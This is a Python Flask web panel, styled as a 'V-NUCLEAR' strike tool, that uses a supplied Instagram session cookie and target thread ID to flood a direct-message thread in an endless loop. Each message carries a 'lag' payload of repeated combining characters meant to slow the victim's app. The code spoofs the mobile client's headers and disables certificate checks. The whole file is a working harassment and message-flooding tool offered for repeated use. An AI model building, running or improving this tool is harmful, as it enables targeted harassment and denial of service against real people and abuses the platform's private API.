import asyncio, httpx, uuid, threading, random, os
from flask import Flask, request, render_template_string

app = Flask(__name__)
active_attacks = {}

# --- 🔱 NUCLEAR ENGINE ---
async def start_firing(task_id, sid, tid):
    url = "https://i.instagram.com/api/v1/direct_v2/threads/broadcast/text/"
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        while active_attacks.get(task_id, False):
            # 🔱 Ultra-Lag Payload
            lag_text = f"🔱 V-NUCLEAR STRIKE 🔱\n[UID: {uuid.uuid4().hex[:5]}]\n" + "👹" * 5 + "\u0E47\u0E48" * 100
            headers = {
                "Cookie": f"sessionid={sid}",
                "User-Agent": f"Instagram {random.randint(280,320)}.0.0.{random.randint(10,99)} Android",
                "X-IG-App-ID": "936619743392459",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            payload = {
                "text": lag_text,
                "thread_ids": f"[{tid}]",
                "client_context": str(uuid.uuid4()),
                "offline_threading_id": str(uuid.uuid4())
            }
            try:
                await client.post(url, headers=headers, data=payload)
            except: pass
            await asyncio.sleep(0.9) # Safe but Fast speed

def run_loop(task_id, sid, tid):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_firing(task_id, sid, tid))

@app.route('/')
def home():
    return '''
    <body style="background:#000; color:#0f0; text-align:center; font-family:monospace; padding-top:50px;">
        <h1 style="color:red; text-shadow: 0 0 10px red;">🔱 V-NUCLEAR PERMANENT PANEL 🔱</h1>
        <div style="border:1px solid #0f0; display:inline-block; padding:30px; border-radius:10px;">
            <form action="/strike" method="post">
                <input name="sid" placeholder="SESSION ID" style="width:300px; padding:10px; margin:10px; background:#111; color:#0f0; border:1px solid #0f0;"><br>
                <input name="tid" placeholder="TARGET TID" style="width:300px; padding:10px; margin:10px; background:#111; color:#0f0; border:1px solid #0f0;"><br>
                <button name="op" value="start" style="background:#0f0; color:#000; padding:10px 20px; font-weight:bold;">START STRIKE</button>
                <button name="op" value="stop" style="background:red; color:#fff; padding:10px 20px; font-weight:bold;">STOP</button>
            </form>
        </div>
        <p style="color:#555; margin-top:20px;">Deploy it once, use it forever.</p>
    </body>
    '''

@app.route('/strike', methods=['POST'])
def strike():
    sid, tid, op = request.form.get('sid'), request.form.get('tid'), request.form.get('op')
    task_id = f"{tid}_{sid[:5]}"
    if op == "start":
        active_attacks[task_id] = True
        threading.Thread(target=run_loop, args=(task_id, sid, tid)).start()
        return "STRIKE ACTIVE! <a href='/'>Back</a>"
    active_attacks[task_id] = False
    return "STRIKE STOPPED. <a href='/'>Back</a>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
  
